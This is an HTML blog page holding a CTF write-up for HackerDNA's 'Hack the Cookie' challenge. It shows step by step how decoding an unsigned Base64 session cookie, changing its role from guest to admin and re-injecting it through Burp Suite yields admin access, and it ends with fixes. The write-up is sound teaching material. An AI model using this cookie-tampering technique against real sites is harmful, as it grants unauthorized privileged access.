@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="Privilege escalation from guest to admin by decoding and modifying an unsigned Base64 session cookie. A classic case of client-side trust gone wrong.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="HackerDNA — Hack the Cookie: Insecure Session Management · 0xAdham">
+  <meta property="og:description" content="Privilege escalation from guest to admin by decoding and modifying an unsigned Base64 session cookie. A classic case of client-side trust gone wrong.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>HackerDNA — Hack the Cookie: Insecure Session Management · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">HackerDNA — Hack the Cookie: Insecure Session Management</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2025-12-08</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> HackerDNA<br />
+<strong>Challenge:</strong> Hack the Cookie<br />
+<strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Easy</p>
+<hr />
+<h2>Overview</h2>
+<p>The challenge involves escalating privileges from a guest user to admin by exploiting insecure cookie handling. No signatures. No encryption. Just vibes.</p>
+<p><strong>Tools:</strong> Burp Suite, FoxyProxy, any Base64 decoder</p>
+<hr />
+<h2>Step 1 — Login as Guest</h2>
+<p>Credentials given: <code>guest:guest</code></p>
+<p>Log in, land on the dashboard. Application shows "low privileges" for the guest role. Something to escalate.</p>
+<hr />
+<h2>Step 2 — Intercept the Cookie</h2>
+<p>Route traffic through Burp Suite. After login, inspect the response headers. There's a cookie:</p>
+<pre><code>user_session: eyJ1c2VyX2lkIjoxLCJ1c2...
+</code></pre>
+<p>Looks like Base64.</p>
+<hr />
+<h2>Step 3 — Decode It</h2>
+<pre><code class="language-bash">echo &quot;eyJ1c2VyX2lkIjoxLCJ1c2Vyb...&quot; | base64 -d
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-json">{
+  &quot;user_id&quot;: 1,
+  &quot;username&quot;: &quot;guest&quot;,
+  &quot;role&quot;: &quot;guest&quot;,
+  &quot;email&quot;: &quot;guest@techcorp.local&quot;
+}
+</code></pre>
+<p>Session data stored client-side. No HMAC. No signature. The role is just a field in a JSON blob.</p>
+<hr />
+<h2>Step 4 — Modify and Re-encode</h2>
+<p>Change <code>"role": "guest"</code> to <code>"role": "admin"</code>:</p>
+<pre><code class="language-json">{&quot;user_id&quot;:1,&quot;username&quot;:&quot;guest&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;guest@techcorp.local&quot;}
+</code></pre>
+<p>Encode back to Base64:</p>
+<pre><code class="language-bash">echo -n '{&quot;user_id&quot;:1,&quot;username&quot;:&quot;guest&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;guest@techcorp.local&quot;}' | base64
+</code></pre>
+<hr />
+<h2>Step 5 — Inject and Forward</h2>
+<p>In Burp, replace the <code>user_session</code> cookie value with the modified one. Forward the request.</p>
+<p>Application accepts it without question. Admin panel loads. Flag captured.</p>
+<hr />
+<h2>Why It Works</h2>
+<p>The server trusted the cookie value entirely — never validated it server-side, never signed it. Base64 is encoding, not encryption. Anyone can decode it, modify it, re-encode it.</p>
+<p>The vulnerability: <strong>client-side session data with no integrity protection.</strong></p>
+<hr />
+<h2>The Fix</h2>
+<ul>
+<li>Never store sensitive data client-side without cryptographic protection</li>
+<li>Use signed cookies (JWT with proper signatures, or HMAC-protected values)</li>
+<li>Implement server-side session management — store session data on the server, only send a session ID to the client</li>
+<li>Validate roles server-side on every privileged action, never trust client input for authorization decisions</li>
+</ul>
+<p><strong>Remember:</strong> Base64 is not security. It's just encoding.</p>
+<hr />
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>Privilege escalation from guest to admin by decoding and modifying an unsigned Base64 session cookie. A classic case of client-side trust gone wrong.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2025-12-08</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">web</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
